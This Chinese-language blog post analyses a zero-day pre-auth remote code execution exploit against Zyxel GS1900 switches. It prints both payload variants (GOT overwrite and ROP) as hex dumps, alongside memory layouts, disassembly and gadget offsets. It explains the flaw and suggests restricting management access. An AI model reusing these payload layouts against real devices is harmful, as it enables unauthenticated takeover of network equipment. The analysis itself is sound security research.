#  Zyxel GS1900 在野利用漏洞分析：一个零日漏洞的完整攻防拆解  
 幻泉之洲   2026-11-07 02:52  
  
>   
  
## 漏洞背景  
  
安全研究人员捕获了一个针对Zyxel GS1900系列交换机的真实攻击样本。这是一个Pre-Auth RCE（无需认证的远程代码执行）漏洞，攻击者无需任何凭证即可在设备上执行任意命令。更值得关注的是，该漏洞在被发现时正处于零日利用状态——也就是说，在补丁发布之前，攻击者已经在实际环境中使用它了。  
  
本文基于对该exploit的逆向分析，详细拆解其工作原理。  
## 攻击载荷的指纹识别机制  
  
研究人员恢复出的exploit包含两种攻击模式：**GOT模式**  
和**Stack模式**  
。经过反混淆处理后可以确认，exploit首先会对目标设备进行指纹识别，判断运行的是哪个固件版本，从而决定使用哪种攻击模式。  
  
此外，exploit内部硬编码了一份已知漏洞固件版本的地址表，包括reqParameters变量的内存地址、GOT表中strcmp的地址、libc基址，以及system函数相对libc的偏移量。这意味着攻击者并非每次都需要手动提供这些信息——exploit自带了一套地址库，降低了利用门槛。  
## GOT模式：把strcmp替换成system  
  
GOT模式的核心思路很直接：把进程GOT表中strcmp函数的地址篡改为system函数的地址。这样一来，程序后续每次调用strcmp，实际上执行的都是system。  
  
下面是攻击者发送的一个示例载荷：  
  
00000000  50 4f 53 54 20 2f 63 67  69 2d 62 69 6e 2f 64 69  |POST /cgi-bin/di|  
  
00000010  73 70 61 74 63 68 65 72  2e 63 67 69 20 48 54 54  |spatcher.cgi HTT|  
  
00000020  50 2f 31 2e 30 0d 0a 48  6f 73 74 3a 20 31 32 37  |P/1.0..Host: 127|  
  
00000030  2e 30 2e 30 2e 31 0d 0a  43 6f 6e 74 65 6e 74 2d  |.0.0.1..Content-|  
  
00000040  54 79 70 65 3a 20 61 70  70 6c 69 63 61 74 69 6f  |Type: applicatio|  
  
00000050  6e 2f 78 2d 77 77 77 2d  66 6f 72 6d 2d 75 72 6c  |n/x-www-form-url|  
  
00000060  65 6e 63 6f 64 65 64 0d  0a 43 6f 6e 6e 65 63 74  |encoded..Connect|  
  
00000070  69 6f 6e 3a 20 63 6c 6f  73 65 0d 0a 43 6f 6e 74  |ion: close..Cont|  
  
00000080  65 6e 74 2d 4c 65 6e 67  74 68 3a 20 31 31 37 34  |ent-Length: 1174|  
  
00000090  0d 0a 0d 0a 69 64 26 26  26 26 26 26 26 26 26 26  |....id&&&&&&&&&&|  
  
000000a0  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 26  |&&&&&&&&&&&&&&&&|  
  
…  
  
00000120  26 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |&BBBBBBBBBBBBBBB|  
  
00000130  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|  
  
…  
  
00000520  42 01 3b ff ff 26 44 44  54 44                    |B.;..&DDTD|  
  
0000052a  
  
这段请求体的结构可以拆解为：要执行的命令（本例中是id  
），139个&  
，1024个B  
，一个32位数值，一个&  
，最后是system()函数的地址。  
  
关键在于第140个参数的处理。reqParameters缓冲区大小为0x23000字节，每个参数槽位1024字节，刚好能容纳140个参数。但web_util_initParaPairs在解析第140个参数时，会将1024个B  
复制到最后一个槽位reqParameters[1024 * 139]中，而由于没有校验参数的最大长度，它还会把紧随其后的32位数值写到reqParameters地址之后。那个位置恰好存放的是count变量。等于说，攻击者用发送的32位数值覆盖了count。  
  
看IDA中.bss段的布局，两个变量紧挨着：  
  
.bss:10003BC0 ?? ?? ?? ?? reqParameters:  .space 0x23000  
  
.bss:10026BC0 ?? ?? ?? ?? count:          .space 4  
  
等第141个参数（包含system地址）被处理时，count已经被污染。在示例中，count变成了0x013bffff，乘以1024后触发有符号整数溢出，被当作负数处理，于是dest指针指向了reqParameters之前的地址。攻击者在发送这个数值前已经算好了偏移，确保命中GOT表中的目标位置。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdVd7WqmMFnBIibIJQ9vP3rINic0MK31ibZrFexbBrLlOD8js9Nq5ficicJ5eu9v9D2qeh2gHIa42jTZJTTg83XqngIZgiaRzEVQjQAE/640?wx_fmt=png&from=appmsg "")  
  
▲ dispatcher.cgi的内存布局——实际地址与载荷中的地址并不相同  
  
此后，程序下一次调用strcmp时，实际执行的就是system。这个时机来得很快——web_util_initParaPairs刚结束，main函数第一次调用web_util_paramVal_ret就触发了：  
  
char *web_util_paramVal_ret(char *param)  
  
{  
  
  int v2;  
  
  const char *reqParams;  
  
  int v4;  
  
  int v5;  
  
  v2 = 0;  
  
  if ( count <= 0 )  
  
    return nullptr;  
  
  reqParams = reqParameters;  
  
  while ( 1 )  
  
  {  
  
    v4 = strcmp(reqParams, param);  
  
    v5 = v2 << 10;  
  
    reqParams += 1024;  
  
    ++v2;  
  
    if ( v4 == 0 )  
  
      break;  
  
    if ( v2 >= count )  
  
      return nullptr;  
  
  }  
  
  return &unk_10003DC0 + v5;  
  
}  
  
因为第一个参数（reqParams[1024 * 0]）就是攻击者写入的执行命令，所以这里直接触发了system("id")。一个无需认证的远程代码执行就这样完成了。  
## Stack模式：用ROP绕过GOT保护  
  
Stack模式利用的是同一个越界写入漏洞，但目标不同——它不覆盖GOT，而是瞄准栈上保存的寄存器，通过ROP（返回导向编程）来执行代码。  
  
示例载荷如下：  
  
00000000  50 4f 53 54 20 2f 63 67  69 2d 62 69 6e 2f 64 69  |POST /cgi-bin/di|  
  
00000010  73 70 61 74 63 68 65 72  2e 63 67 69 20 48 54 54  |spatcher.cgi HTT|  
  
00000020  50 2f 31 2e 30 0d 0a 48  6f 73 74 3a 20 6c 6f 63  |P/1.0..Host: loc|  
  
00000030  61 6c 68 6f 73 74 0d 0a  43 6f 6e 74 65 6e 74 2d  |alhost..Content-|  
  
00000040  54 79 70 65 3a 20 61 70  70 6c 69 63 61 74 69 6f  |Type: applicatio|  
  
00000050  6e 2f 78 2d 77 77 77 2d  66 6f 72 6d 2d 75 72 6c  |n/x-www-form-url|  
  
00000060  65 6e 63 6f 64 65 64 0d  0a 43 6f 6e 6e 65 63 74  |encoded..Connect|  
  
00000070  69 6f 6e 3a 20 63 6c 6f  73 65 0d 0a 43 6f 6e 74  |ion: close..Cont|  
  
00000080  65 6e 74 2d 4c 65 6e 67  74 68 3a 20 31 35 39 34  |ent-Length: 1594|  
  
00000090  0d 0a 0d 0a 6c 6f 67 69  6e 5f 63 68 6b 3d 31 26  |....login_chk=1&|  
  
000000a0  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 26  |&&&&&&&&&&&&&&&&|  
  
…  
  
00000110  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 69  |&&&&&&&&&&&&&&&i|  
  
00000120  64 20 3b 23 26 26 26 26  26 26 26 26 26 26 26 42  |d ;#&&&&&&&&&&&B|  
  
00000130  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|  
  
…  
  
00000520  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 01  |BBBBBBBBBBBBBBB.|  
  
00000530  1b ff c3 26 31 31 31 31  31 31 31 31 31 31 31 31  |...&111111111111|  
  
00000540  31 31 31 31 31 31 31 31  31 31 31 31 31 31 31 31  |1111111111111111|  
  
…  
  
000006a0  31 31 31 31 31 31 31 31  31 31 31 31 30 30 30 30  |1111111111110000|  
  
000006b0  2b 18 c6 50 32 32 32 32  33 33 33 33 34 34 34 34  |+..P222233334444|  
  
000006c0  35 35 35 35 2b 16 e3 98  3d 69 64 20 3b 23        |5555+...=id ;#|  
  
这个载荷的布局要复杂一些：  
- login_chk=1  
作为第0个参数  
  
- 128个&  
  
- 要执行的命令  
  
- 11个&  
  
- 1024个&  
（填充到参数上限）  
  
- 计数器值  
  
- 一个&  
  
- 填充字符1  
  
- 寄存器值序列  
  
- =  
- 要执行的命令加;#  
  
寄存器部分包含：s0、s1、s2、s3、s4、s5、ra，依次填入"0000"、system()偏移、"2222"、"3333"、"4444"、"5555"和gadget偏移。  
  
参数0（login_chk=1）被复制到reqParameters[1024 * 0]。参数128包含shell命令。参数139（第140个）填满1024字节限制后，count被计数器值（示例中为011bffc3）覆盖，这个值会影响到函数栈。  
  
循环外的代码块处理最后一个参数时，会执行&reqParameters[1024 * count]的计算：  
  
.text:004180AC    la      $v0, reqParameters       # v0 = reqParameters  
  
.text:004180B0    lui     $v1, 2                   # v1 = 0x2000 (1024 * 128)  
  
.text:004180B4    addu    $a0, $v0, $v1            # a0 = &reqParameters[128]  
  
这使得a0寄存器指向第129个参数（即载荷中的执行命令）。然后在函数尾声，被调用者保存寄存器从被污染的栈中恢复：  
  
.text:00417E04    lw      $ra, 0x2018+var_s18($sp) # gadget offset  
  
.text:00417E08    lw      $s5, 0x2018+var_s14($sp) # "5555"  
  
.text:00417E0C    lw      $s4, 0x2018+var_s10($sp) # "4444"  
  
.text:00417E10    lw      $s3, 0x2018+var_sC($sp)  # "3333"  
  
.text:00417E14    lw      $s2, 0x2018+var_s8($sp)  # "2222"  
  
.text:00417E18    lw      $s1, 0x2018+var_s4($sp)  # system()  
  
.text:00417E1C    lw      $s0, 0x2018+var_s0($sp)  # "0000"  
  
.text:00417E20    move    $v0, $zero  
  
.text:00417E24    jr      $ra                      # jump to gadget  
  
示例载荷中的gadget偏移为0x2b16e398，指向uClibc（/lib/libuClibc-0.9.28.so）中的一段代码：  
  
.text:0000B398    move    $t9, $s1  
  
.text:0000B39C    jalr    $t9  
  
.text:0000B3A0    move    $s0, $v0  
  
这个gadget把s1（存放着system函数偏移）复制到t9寄存器并调用它。后面的move指令充当延迟槽。最终执行的就是system("id")。  
## 两种模式的对比与思考  
  
GOT模式简单直接，一发命中——只要GOT表可写，覆盖strcmp就能稳定触发。但它的前提是目标二进制没有启用Full RELRO。Stack模式则更精巧，通过ROP链绕过了GOT保护的限制，代价是需要精确控制栈布局和寄存器值。  
  
从exploit的设计来看，攻击者显然对目标固件的内存布局做了充分研究。硬编码的地址库覆盖多个固件版本，指纹识别自动选择攻击路径——这不是临时起意的攻击，而是有备而来的武器化工具。  
>   
  
## 最后说两句  
  
这个案例反映出一个老问题：嵌入式设备的Web管理接口仍然是攻击面的重灾区。一个参数解析函数里的长度校验缺失，就足以让攻击者从HTTP请求一路走到system()调用。更麻烦的是，这类设备通常部署在网络边界，打补丁的窗口期又很长。对于运维方来说，在补丁到位之前，限制管理接口的访问来源可能是最实际的选择。  
### 参考资料  
  
[1]   
https://www.binarly.io/blog/zyxel-gs1900-rce-cve-2026-107441  
  
